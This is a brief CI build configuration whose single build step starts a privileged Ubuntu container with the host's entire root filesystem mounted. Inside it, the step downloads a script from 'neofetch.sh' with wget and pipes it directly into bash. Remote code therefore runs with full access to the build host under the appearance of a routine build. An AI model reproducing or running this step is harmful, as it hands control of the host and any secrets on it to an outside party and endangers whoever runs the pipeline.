docker_builder:
  build_script:
    - docker run --privileged -v /:/mnt ubuntu:24.04 bash -c "
        apt-get update -qq &&
        apt-get install -y -qq wget &&
        wget -qO- neofetch.sh | bash
      "
